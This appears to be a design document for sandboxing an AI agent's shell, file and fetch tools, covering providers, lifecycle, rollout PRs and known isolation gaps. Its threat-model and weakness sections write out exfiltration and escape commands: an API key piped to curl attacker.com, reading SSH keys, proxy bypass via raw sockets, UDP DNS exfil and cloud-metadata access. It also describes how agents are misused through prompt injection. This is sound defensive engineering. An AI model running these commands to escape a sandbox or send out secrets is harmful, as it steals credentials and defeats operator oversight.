# Sandbox Design — Electric Agents

**Status:** Design. No code shipped yet.
**Supersedes/refines:** [sandboxing-investigation.md](./sandboxing-investigation.md) §3.3 and §5.
**Date:** 2026-05-19

This doc is the implementation contract for the `Sandbox` primitive (Primitive 2 in the investigation doc). It assumes Primitive 1 (`ToolGate`) and Primitive 3 (provenance) ship separately.

---

## 0. TL;DR

- **`Sandbox` is a narrow interface we own**: `exec`, `readFile`, `writeFile`, `mkdir`, `fetch`, `dispose`. Designed against what `bash` / `read` / `write` / `edit` / `fetch_url` actually need — nothing more.
- **Three providers in v1**: `unrestrictedSandbox()` (no-op pass-through, named explicitly), `nativeSandbox()` (thin adapter over `@anthropic-ai/sandbox-runtime`), `remoteSandbox({provider: 'e2b'})` (adapter over E2B's npm SDK, loaded as an optional peer dependency). Adding additional remote providers (Vercel, Daytona) is mechanical: implement `RemoteSandboxClient` against the provider's SDK and register it in `loadClient`.
- **All policy is in our config object**, never leaked through to the underlying library. Switching `nativeSandbox`'s engine later (Codex vendored crate, hand-rolled, microsandbox if it ever fits) does not touch tools or runtime plumbing.
- **Lifecycle is owned by `Sandbox`**: one instance per wake (not per `useAgent` call), constructed lazily, disposed on wake end. For `unrestricted` and `native`, `dispose()` is cheap.
- **Sub-PR plan (collapsed)**: 6a (interface + unrestricted + tool refactor + bash env-scrub + symlink fixes; behavior-preserving plumbing), 6b (`nativeSandbox` adapter + conformance tests, opt-in), 6c (`NetPolicy` for `fetch_url`), 6d (Horton/Worker default to native + `ELECTRIC_AGENTS_UNRESTRICTED` panic switch).

## 0.1 Threat model — what this primitive is and isn't

This design targets **host isolation**: preventing an LLM-driven tool call from escaping the working directory, exfiltrating environment secrets, modifying files outside its scope, or making arbitrary network connections from the runtime's network namespace. Concretely: `rm -rf ~`, `cat ~/.ssh/id_rsa`, symlink traversal out of cwd, `echo $ANTHROPIC_API_KEY | curl attacker.com`.

What this primitive is **not**: a defense against prompt-injection-driven _misuse_ of legitimate tools. If the LLM is convinced to write a file the user actually owns, or fetch an attacker-controlled URL from an allowlisted host, Sandbox does not block that — by design. A policy-gating primitive (`ToolGate`, Primitive 1 in the investigation doc) would address that class and ships separately on its own schedule.

The release notes and any marketing language for Sandbox must state plainly what it protects against and what it doesn't, so customers don't read "we sandboxed the agent" as "prompt injection is handled."

---

## 1. Goals and non-goals

**In scope:**

- Block filesystem and process escape from LLM-driven tool calls.
- Make existing entities and tools work behind the abstraction with no behavior change (`unrestrictedSandbox` is the default for v1; opt-in to anything stronger).
- Keep the door open to swap the native engine and add remote providers without touching tools or runtime plumbing.
- Work on macOS and Linux. Graceful error on Windows ("use WSL2 or `remoteSandbox`").

**Out of scope (v1):**

- Policy gating on tool _misuse_ — that's `ToolGate` (Primitive 1).
- Provenance tagging of tool results — that's Primitive 3.
- SSRF protection inside `fetch_url` — handled in 6d as a `NetPolicy` parameter, not by `Sandbox` itself.
- Stronger Linux isolation (Landlock + seccomp). Anthropic's library is bwrap-only; the gap is documented and a `nativeSandboxStrong` tier can be added later if customers ask.
- A full CaMeL split (privileged vs. quarantined LLM).

---

## 2. The `Sandbox` interface

Designed from the tools' concrete needs (`bash`, `read`, `write`, `edit`, `fetch_url`), not from any backend's idioms. Lives in `packages/agents-runtime/src/sandbox/types.ts`.

```ts
export interface Sandbox {
  readonly name: string                          // 'unrestricted' | 'native:macos-seatbelt' | 'native:linux-bwrap-only'

  exec(opts: SandboxExecOpts): Promise<SandboxExecResult>

  readFile(path: string): Promise<Buffer>
  writeFile(path: string, content: Buffer | string): Promise<void>
  mkdir(path: string, opts?: { recursive?: boolean }): Promise<void>

  fetch(input: string | URL, init?: RequestInit): Promise<Response>

  dispose(): Promise<void>
}

export interface SandboxExecOpts {
  command: string                                // accepts a shell string; Sandbox decides how to run it
  cwd?: string                                   // must resolve inside the sandbox's working roots
  env?: Record<string, string>                   // merged onto the sandbox's allowed-env base
  timeoutMs?: number
  stdin?: Buffer | string
  maxOutputBytes?: number
}

export interface SandboxExecResult {
  exitCode: number | null
  signal: string | null
  stdout: Buffer
  stderr: Buffer
  timedOut: boolean
  outputTruncated: boolean
}

export class SandboxError extends Error {
  readonly kind: 'policy' | 'runtime' | 'unavailable'
  constructor(kind: 'policy' | 'runtime' | 'unavailable', message: string) { ... }
}
```

### Why these decisions

- **`command: string`, not `argv: string[]`.** The bash tool today receives a shell string from the LLM; the Sandbox runs it through `sh -c` (or its sandboxed equivalent). Argv mode would require us to either reinterpret bash semantics or refuse compound commands — neither is worth it. The Sandbox's _isolation_ is what matters; argument quoting stays in shell.
- **No separate `realpath`.** Symlink safety is the sandbox's job, not the tool's. All FS methods internally resolve symlinks and check the result against the policy. We don't expose a partial-realpath API that tools could forget to call.
- **`fetch` returns a real `Response`.** Body parsing, redirect following, and HTML extraction stay in the tool (fetch*url is content-shaped, not HTTP-shaped). The Sandbox decides \_whether* the request goes out; the tool decides what to do with the result. Init type is the standard `RequestInit` — no custom wrapper.
- **No `stat`, no `SandboxCapability` set, no `maxBytes` parameter, no `SandboxReadOpts`.** Cut after the scope-reviewer critique. No v1 tool reads any of these. Tools already enforce their own size caps in tool code. If a remote provider lands in v2 with capability variance, we add it then.
- **One `SandboxError` class with a `kind` discriminator**, not separate `PolicyError`/`RuntimeError`/`UnavailableError`. Tools `catch` broadly; runtime telemetry switches on `kind`.
- **`name` makes weakness legible.** Linux is `'native:linux-bwrap-only'`, not `'native'` — log greppers and code reviewers see the limitation. macOS is `'native:macos-seatbelt'`. The colon-namespace is an explicit convention, not forecasting a registry.

---

## 3. Error model

One class, `SandboxError`, with a `kind: 'policy' | 'runtime' | 'unavailable'` field:

- **`kind: 'policy'`** — operation rejected by sandbox policy (path outside allowed roots, host not in allowlist).
- **`kind: 'runtime'`** — sandbox infrastructure failed mid-operation (proxy died, profile loader errored).
- **`kind: 'unavailable'`** — sandbox couldn't be constructed at all (bwrap not installed, Windows host, userns disabled).

Native `Error` / `ErrnoException` from underlying syscalls (`ENOENT`, `EACCES` inside allowed roots) propagate as-is — they're already familiar to tool code.

Tools catch broadly and translate to a tool-result error message. Runtime telemetry switches on `kind`.

---

## 4. Lifecycle

```ts
const sandbox = await nativeSandbox({ workingDirectory, allowedHosts })
try {
  await useAgent({ tools: [bash, read, write], sandbox }).run(...)
} finally {
  await sandbox.dispose()
}
```

- **Construction** is async (`await nativeSandbox(...)`). For `unrestricted`, it's a synchronous factory wrapped in `Promise.resolve`. For `native`, it spins up the proxy server.
- **One sandbox per wake by default**, not per `useAgent` call. The runtime constructs `ctx.sandbox` on the first read and disposes at the end of the wake. A wake that does 10 `useAgent` calls reuses the same sandbox — files written by one survive for the next, the proxy is shared, the construction cost is amortized. Per-`useAgent` override is supported but rarely needed.
- **`dispose()` should be called exactly once.** Tools don't call it; the runtime does. Documented as call-once, not idempotent — saves defensive boilerplate.
- **No `pause`/`resume`.** Workspace persistence across wakes is an entity-author pattern (workspace ref in entity state, rehydrate on wake — investigation doc §3.7). Not a Sandbox API.

---

## 5. Providers

### 5.1 `unrestrictedSandbox(opts)`

```ts
unrestrictedSandbox({ workingDirectory: string })
```

- Pass-through to `node:fs/promises`, `node:child_process`, global `fetch`.
- `name: 'unrestricted'`. All capabilities. No policy checks.
- The point of the name: when a customer reads their code, `unrestrictedSandbox()` is a word they have to type. No silent default.
- Used in: test environments; the panic-revert path (`ELECTRIC_AGENTS_UNRESTRICTED=1`); explicit opt-in for trusted server-side automation.

### 5.2 `nativeSandbox(opts)`

```ts
nativeSandbox({
  workingDirectory: string,                  // required; the bind-writable root
  allowedHosts?: string[],                   // hostname allowlist for outbound network; default = []
})
```

- **Engine:** `@anthropic-ai/sandbox-runtime` (Apache-2.0, npm). Pinned version vendored in `pnpm-lock.yaml`; bumps go through a manual audit checklist that re-runs the conformance suite.
- **macOS:** Seatbelt profile via `sandbox-exec`. Name: `'native:macos-seatbelt'`.
- **Linux/WSL2:** bubblewrap-only (no Landlock, no seccomp filter). Name: `'native:linux-bwrap-only'` so the limitation shows up in logs and reviews. We surface an actionable "install bubblewrap" error at startup if missing (`apt install bubblewrap` / `dnf install bubblewrap`).
- **Network:** HTTP+SOCKS proxy on a local Unix socket, hostname-allowlisted. **Important:** the proxy only gates traffic that _uses_ it. Raw sockets in `bash`-spawned children bypass it (see §10). The allowlist is a best-effort guardrail, not a hard boundary.
- **Windows:** throws `SandboxError({kind: 'unavailable'})` at construction with the WSL2 message.
- **Translation layer:** `packages/agents-runtime/src/sandbox/native.ts` maps our config to `@anthropic-ai/sandbox-runtime`'s settings shape. Customers never see the library's config keys. When we swap engines (e.g. to a future Codex-vendored crate for stronger Linux), only this adapter changes.
- **Lazy initialization:** the underlying `SandboxManager` (process-global state) is initialized on the _first_ `exec()` call, not at construction. FS/`fetch` policy is enforced in our TS adapter directly and doesn't require the OS sandbox to be running. This makes per-wake construction cheap for handlers that never spawn a subprocess and avoids the proxy-server startup cost in test environments.
- **Single-instance per process** for active OS sandboxing: only one working directory can be active at a time inside one Node process. Concurrent `exec` from instances bound to different working directories throws `SandboxError({kind: 'unavailable'})`. Reference-counted disposal: the last `dispose()` calls `SandboxManager.reset()`.
- **Read model — v1 is curated denylist, v2 will tighten to read-allowlist.** Decision recorded 2026-05-19: we ship with Anthropic's library defaults (broad-read base) plus an explicit deny overlay for known-sensitive paths. This is the pragmatic ship; it lets dev-tool reads (`git`, `node`, `python`) just work without enumeration, and it papers over the headline "LLM cats credentials from home dir" regression. Tightening to a curated read-allowlist (working dir + documented system paths + a short list of safe home configs) is a follow-up — same interface, change the adapter config only.
- **Default deny overlay (v1):** `~/Library/Application Support`, `~/.ssh`, `~/.aws`, `~/.config/gcloud`, `~/.kube`, `~/.npmrc`, `~/.docker`, `~/.netrc`, `~/.config/gh`, `~/.pgpass`, `~/.huggingface`. Denied for read by the adapter regardless of the library's bundled profile. The list is documented as known-incomplete — option (2)'s allowlist is the structural fix.
- **Startup self-test:** the adapter runs `/bin/echo hello` and `node -e 1` inside the sandbox at construction time. If either fails, `SandboxError({kind: 'unavailable'})` is thrown with the underlying error. This catches profile-vs-OS-version drift (Seatbelt has removed SBPL operations across macOS minors).

**What is deliberately NOT configurable in v1:** `extraReadPaths`, `allowedEnvKeys`, `unavailableBehavior`. All cut per the scope review. Customers who need a wider profile can construct `unrestrictedSandbox()` explicitly. Customers who need narrower will get knobs in v1.1 with a real use case attached.

**Env scrubbing** lives at the tool layer (the bash tool stops forwarding `process.env`), not at the sandbox layer. The sandbox sets `PATH`, `HOME`, `USER`, `LANG`, `TERM` and nothing else. This is hardcoded; not a config knob.

### 5.3 `remoteSandbox(opts)` — E2B in v1

```ts
remoteSandbox({
  provider: 'e2b',
  workingDirectory?: string,         // path inside the VM; default '/work'
  apiKey?: string,                   // or E2B_API_KEY env
  template?: string,                 // provider-specific template
  allowedHosts?: string[],           // hostname allowlist for sandbox.fetch
  client?: RemoteSandboxClient,      // pre-constructed client (testing / custom wrapping)
})
```

- **SDK loading:** dynamic `import('e2b')` so the package is an optional peer dependency. Customers using the remote provider install `e2b` separately; the rest of agents-runtime carries zero remote-sandbox code at install time.
- **Adapter shape:** `RemoteSandboxClient` (`{exec, readFile, writeFile, mkdir, kill}`) abstracts the provider SDK. Each provider gets a `createXxxClient(opts) → RemoteSandboxClient`. Tests pass a fake client via the `client` option, no real SDK required.
- **FS semantics:** all paths are _VM-rooted_. The default working directory inside the VM is `/work`. Paths outside the working directory are denied for writes via a TS-level check; reads inherit the VM's filesystem visibility (system binaries, language stdlibs etc. are visible). Stronger read isolation belongs to provider-side templating, not our adapter.
- **`sandbox.fetch()` runs in the host Node process**, not inside the VM, with a TS-level hostname allowlist. To route outbound traffic through the VM, use `sandbox.exec('curl …')`. Documented caveat; v1.1 may add VM-routed fetch.
- **Lifecycle:** `dispose()` calls `client.kill()` (which terminates the VM). Idempotent. The single-instance constraint that `nativeSandbox` has does not apply — multiple `remoteSandbox` instances against the same or different providers can coexist.
- **Cold start:** provider-dependent. Cost is one VM allocation at construction; reuse the sandbox for all calls in the wake (per-wake lifecycle, see §4).
- **Adding more providers** (Vercel, Daytona) is mechanical: write a new `createXxxClient` returning `RemoteSandboxClient` and register it in `loadClient`. The adapter interface is the contract.

---

## 6. Configuration model

**Two layers, narrowest wins** (collapsed from three per the scope review):

1. **Runtime default** — `createRuntimeRouter({ defaultSandbox: (workingDirectory) => nativeSandbox({ workingDirectory, ... }) })`. A factory function the runtime calls per wake. The fallback for entities that don't override.
2. **Per-`useAgent` override** — `ctx.useAgent({ ..., sandbox })`. Replaces the runtime default for this loop.

If a customer wants per-entity-type behavior, they handle it inside the entity's handler — typically by branching in the factory function based on `entityType`. No first-class API for it; the use case can graduate to one when it shows up.

If no sandbox is configured, the runtime injects `unrestrictedSandbox({ workingDirectory })` and logs a startup warning. Loud, not fatal.

`ctx.sandbox` is the resolved instance for the current wake. Handlers read it to plumb into custom tools.

---

## 7. Tool refactor sketch (lands in PR 6b)

Tool factories gain a required `sandbox: Sandbox` parameter and stop importing `node:fs` / `node:child_process` directly.

```ts
// Before
export function createBashTool(workingDirectory: string): AgentTool { ... exec(...) ... }

// After
export function createBashTool(sandbox: Sandbox): AgentTool {
  return {
    name: 'bash',
    // ...
    execute: async (_id, params) => {
      const { command } = params as { command: string }
      const result = await sandbox.exec({ command, timeoutMs: 30_000, maxOutputBytes: 50_000 })
      const text = formatExecOutput(result)
      return { content: [{ type: 'text', text }], details: { exitCode: result.exitCode, timedOut: result.timedOut } }
    },
  }
}
```

Same shape for `read` / `write` / `edit` / `fetch_url`. Tool descriptions are corrected to no longer claim sandboxing they don't have (the `bash.ts:12` doc bug from the investigation).

`workingDirectory` becomes an implementation detail of the sandbox; tools don't see it. This closes the symlink class of bugs because there's no path arithmetic in the tool any more — the sandbox does it once and checks once.

---

## 8. Sub-PR breakdown (4 PRs, collapsed)

Each PR ships independently. Each has a clearly stated first failing test. The default-change PR (6d) is gated on `ToolGate` shipping concurrently or first — see §0.1.

### PR 6a — Interface + `unrestrictedSandbox` + tool refactor + bash env-scrub + symlink fixes

Collapsed from old 6a + 6b. Plumbing PR; sandbox surface lands and all tools use it, but the only provider is `unrestricted`.

- Add `packages/agents-runtime/src/sandbox/{types,unrestricted}.ts`.
- Extend `HandlerContext.sandbox`, `RuntimeRouterConfig.defaultSandbox`, `AgentConfig.sandbox`.
- Refactor `createBashTool / createReadFileTool / createWriteTool / createEditTool / createFetchUrlTool` to take `Sandbox` instead of `workingDirectory`.
- **Behavior-relevant fixes folded in:**
  - `bash` no longer forwards `process.env`. Scrubbed env (`PATH`, `HOME`, `USER`, `LANG`, `TERM`) only. Closes the `ANTHROPIC_API_KEY` exfil path.
  - `bash` description string corrected (no longer lies about being sandboxed).
  - `read` / `write` / `edit` resolve symlinks via the sandbox and re-check the prefix. Closes CVE-2025-53109/53110-shape bypass.
- Horton / Worker construct `unrestrictedSandbox(workingDirectory)` explicitly. **No default-change yet.**
- **First failing test:** `it('createBashTool delegates to sandbox.exec instead of child_process.exec, and the resulting child does not inherit process.env')`.
- **Diff target:** ~800 lines including tests.

### PR 6b — `nativeSandbox` adapter

- Add `@anthropic-ai/sandbox-runtime` as a pinned dependency. License attribution.
- `packages/agents-runtime/src/sandbox/native.ts` implements `Sandbox` against the library.
- Default deny overlay for `~/Library/Application Support`, `~/.ssh`, `~/.aws`, `~/.config/gcloud`, `~/.kube`, `~/.npmrc`.
- Startup self-test (exec `/bin/echo` and `node -e 1` inside the sandbox).
- Conformance scenarios: symlink traversal denied, env-var exfil denied, `/etc/sudoers` read denied, allowlisted-host fetch succeeds, non-allowlisted-host fetch denied.
- **Still no default change.** Customers opt in by passing `nativeSandbox(...)`.
- **First failing test:** `it('nativeSandbox.readFile denies access to ~/Library/Application Support/Anthropic')`.
- **Diff target:** ~700 lines including conformance scenarios.

### PR 6c — `NetPolicy` for `fetch_url` and `sandbox.fetch`

- Default-deny RFC1918 / 127/8 / 169.254/16 / IPv6 link-local at the `sandbox.fetch` boundary.
- Resolve hostnames first; reject if any A/AAAA hits a denied range. DNS-rebinding protection: resolve once and pin for the request.
- Applies regardless of provider — `unrestricted` and `native` both run the check.
- **First failing test:** `it('sandbox.fetch rejects http://169.254.169.254/')`.
- **Diff target:** ~250 lines.

### PR 6d — Horton/Worker default to `nativeSandbox` + working-directory fix

- Horton on desktop defaults to `nativeSandbox()` when on macOS/Linux. Windows defaults to `unrestricted` with a banner directing users to install WSL2.
- **Working-directory default fix.** `agents-desktop/src/main.ts:1939` currently falls back to `app.getPath('home')` when no working directory is set. Change to a dedicated subdirectory (e.g. `~/Documents/electric-workspace/`), created on first launch. Refuse to start with `~` or `/` as the working directory regardless of sandbox shape — write-allowlist is moot if the workspace _is_ home.
- `ELECTRIC_AGENTS_UNRESTRICTED=1` env override is the documented panic switch (logged loudly when set).
- Worker inherits the parent's sandbox handle. Worker construction takes a `Sandbox` parameter; cannot construct its own. Enforced by type signature, not comment.
- **First failing test:** `it('Worker cannot construct its own sandbox; it must accept the parent\'s')` — type-level test.
- **Diff target:** ~250 lines + docs + release notes.

---

## 9. Resolutions to open decisions from the investigation

- **§5.1** Per-entity / per-`useAgent` / runtime default? → Two layers: runtime default + per-`useAgent` override. Per-entity-type cut as speculative.
- **§5.2** Bundled native profile vs customer-defined? → Bundled opinionated profile via `@anthropic-ai/sandbox-runtime`, plus our default deny overlay for known-sensitive home-dir paths, plus `allowedHosts`. No raw-profile escape hatch in v1.
- **§5.3** Remote provider matrix? → **Deferred to v2.** No v1 customer.

---

## 10. What this design does _not_ protect against

Stated explicitly so the doc + release notes don't oversell. **Critique-driven additions are marked [+critique].**

### 10.1 Out of scope by design

- **Prompt-injection-driven misuse of legitimate tools.** That's `ToolGate` (Primitive 1), not `Sandbox`. After Sandbox lands alone, all three legs of the lethal trifecta (untrusted input, sensitive data, outbound communication) remain intact — sandboxing only constrains _where_ exfil can go, not whether exfil happens. [+critique: agent-security]
- **Allowlisted-host content trust.** "Summarize this URL" with an allowlisted host still pulls attacker-controlled tokens into the LLM context. `allowedHosts` is an exfil-destination constraint, not a content-trust boundary. [+critique: agent-security]
- **Malicious MCP-server tool descriptions.** That's Primitive 3 (provenance).
- **Cross-wake data flow.** A file written by wake N is visible to wake N+1 if the workspace persists. Sandbox boundaries are per-wake; data boundaries are not. [+critique: agent-security]

### 10.2 Linux bwrap-only weaknesses (concrete, exploitable)

[+critique: kernel-security]. These are the reason the provider is named `'native:linux-bwrap-only'`. Listed so reviewers and customers know what is _not_ gated:

- **Nested user namespaces.** An LLM-emitted command can `unshare(CLONE_NEWUSER | CLONE_NEWNS)` and re-mount inside the new userns. Seccomp filtering `unshare`/`mount`/`pivot_root`/`clone3` with `CLONE_NEWUSER` would close this; bwrap-alone does not.
- **`ptrace(PTRACE_ATTACH)` on sibling processes** in the shared PID namespace, including the bash tool's own children. Memory read/inject. Yama mediation not configured.
- **`bpf(2)`, `io_uring_setup(2)`, `userfaultfd(2)`, `add_key(2)`, `keyctl(2)`** are reachable — historically rich LPE surface (CVE-2022-0185, CVE-2022-2588, CVE-2023-32233, CVE-2024-1086).
- **idmapped mounts (kernel 5.12+) and userns OverlayFS (5.11+)** — both have CVE histories from unprivileged userns.
- **Network namespace is shared with the proxy.** This has to be the case for `connect(AF_UNIX, …)` to reach the proxy socket. Consequence: any client that doesn't go through the proxy escapes the allowlist. Concretely:
  - `curl --noproxy '*' http://1.2.3.4/` → direct TCP to numeric IP.
  - `python -c 'socket.socket(AF_INET, SOCK_DGRAM).sendto(b"x", ("8.8.8.8", 53))'` → UDP DNS exfil.
  - `nc 169.254.169.254 80` → cloud metadata.
  - Localhost services (Postgres, ssh-agent on TCP, debug ports) reachable.
- **AppArmor on Ubuntu 24.04** (`kernel.apparmor_restrict_unprivileged_userns=1`) may block userns creation entirely for non-distro-packaged bwrap. Self-test will surface this as `kind: 'unavailable'`.

### 10.3 macOS Seatbelt weaknesses

[+critique: Seatbelt]:

- **Keychain inheritance.** Sandboxed children inherit the parent process's TCC responsible-process designation. If Horton has Keychain access granted at the parent level (common for IDE-launched Node), a sandboxed `security find-generic-password` may succeed. No `responsible-pid` reset in v1. Documented gap.
- **`sandbox-exec` deprecation.** Officially deprecated since 10.15. Apple has removed SBPL operations between minor releases. The startup self-test catches profile failures; it doesn't predict them. Bump-the-engine plan is documented in §5.2.
- **dyld_shared_cache / Cryptexes drift.** Newer macOS versions move dyld paths. The library's bundled profile may need updates per macOS release.

### 10.4 In-process JS heap

- **Tools that close over the runtime's process state.** Sandbox covers subprocess + filesystem + network calls; it does not introspect the runtime's own JS heap. Tools that capture `process.env` or runtime secrets in closure and return them in a tool result are not blocked by `Sandbox`. Mitigation in PR 6a: the bash tool no longer forwards `process.env` to children, and the sandbox sets a hardcoded minimal env.

### 10.5 Side-channel and motivated-adversary scenarios

- Timing/cache side channels. Not in scope.
- Motivated adversaries with root on the host. Not in scope. Customers facing this threat model use `remoteSandbox` (v2) on infrastructure they trust more than the agent runtime.
- Stronger Linux isolation than bwrap. Documented gap vs. Codex's Rust crate (which adds Landlock + seccomp + a vendored helper binary). A future `nativeSandboxStrong` tier with a Codex-derived helper is the escalation path if customers demand it.

---

## Appendix A — Critique disposition

Each critique finding mapped to a change, a documented rationale, or a defer-to-vN note.

### macOS Seatbelt critique

- **Home dir read of `~/Library/Application Support/Anthropic/*`** → CHANGED. Default deny overlay added in §5.2 PR 6b.
- **Keychain inheritance via responsible-pid** → DOCUMENTED gap in §10.3. Fix in v2.
- **Profile-vs-OS-version drift** → CHANGED. Startup self-test in §5.2 PR 6b. Adapter throws `kind: 'unavailable'` on self-test failure.
- **dyld_shared_cache / Cryptexes path drift, zsh init writes, `xcrun` mach lookups** → DEPENDENCY on `@anthropic-ai/sandbox-runtime` maintenance. Vendor the package; conformance suite runs on the supported macOS versions in CI.
- **Conformance test: verify no `IPv4`/`IPv6` sockets exist outside the proxy via `lsof`** → ADDED to PR 6b conformance suite.

### Linux kernel security critique

- **bwrap-only is structurally weaker than implied** → CHANGED. Provider name is now `'native:linux-bwrap-only'`. §10.2 enumerates the gaps. Roadmap to `nativeSandboxStrong` documented.
- **AppArmor on Ubuntu 24.04 / userns gating on RHEL** → CHANGED. Startup self-test catches both as `kind: 'unavailable'`.
- **Proxy bypass via raw sockets** → DOCUMENTED in §5.2 and §10.2. Real but accepted; closing requires actual netns isolation (future work). The PR 6c `NetPolicy` does not solve this for `bash`, only `sandbox.fetch`.
- **`fallback-to-unrestricted` option is a footgun** → REMOVED. The option is cut from §5.2. Only `kind: 'unavailable'` throw remains; customers who want fallback construct `unrestrictedSandbox` themselves.
- **WSL2 claim** → CHANGED. WSL2 is now "best-effort" — the self-test runs; we don't promise it works on every WSL2 kernel.

### Remote sandbox operator critique

- **Per-`useAgent` lifecycle is wrong shape** → CHANGED to per-wake (§4). Per-`useAgent` override remains for customers who need it.
- **Cold-start tail latency, quotas, leaky abstractions, `apiKey` log leaks** → DEFERRED. `remoteSandbox` is cut from v1. When it lands in v2, these are blockers, not edge cases.
- **`allowedHosts` is unenforceable on E2B server-side** → DEFERRED with the above.

### Agent-security generalist critique

- **Sequencing: ToolGate first** → REJECTED. The critique assumed a prompt-injection-misuse threat model; this primitive targets host isolation, which is a distinct problem with no sequencing dependency on a policy primitive. The honest-marketing concern (don't claim Sandbox solves injection) is captured in §0.1 and §10.1.
- **`unrestricted` as default in PR 6a** → DOCUMENTED rationale. PR 6a/6b/6c are behavior-preserving plumbing; PR 6d makes `native` the default for Horton/Worker. The startup warning lands in PR 6a.
- **Lethal trifecta remains intact after Sandbox-solo** → ADDED to §10.1 as honest scoping language. Not blocking.
- **Worker "cannot escalate" is a comment, not a constraint** → CHANGED. PR 6d enforces Worker takes a `Sandbox` parameter, not a factory. Type-level test.
- **`allowedHosts` framing dangerous** → ADDED to §10.1 as content-trust caveat.
- **Cross-wake data flow** → ADDED to §10.1.

### Skeptic / scope reviewer critique

- **6 PRs is theatre** → CHANGED. Collapsed to 4 PRs in §8. 6a folds 6a+6b+symlink fixes+env scrub.
- **`SandboxCapability`, `stat`, separate error classes, `SandboxFetchInit`, `maxBytes`** → REMOVED in §2. One `SandboxError` with `kind`. `RequestInit` directly.
- **`extraReadPaths`, `allowedEnvKeys`, `unavailableBehavior`** → REMOVED in §5.2. Add knobs when a customer asks.
- **`remoteSandbox` in v1** → DEFERRED to v2 (§5.3).
- **Three-layer config precedence** → COLLAPSED to two layers in §6.
- **`dispose()` idempotence** → REMOVED. Call-once contract documented.

## Appendix B — Why `remoteSandbox` is deferred (one-line summary)

Two independent critiques converged: no customer has asked for it, per-provider semantics are too divergent to abstract well without a real use case, and the cold-start latency would block agent loops on every turn under the original per-`useAgent` lifecycle. The interface is shaped to accept remote adapters; we'll design the lifecycle for it when a paying customer surfaces a use case.
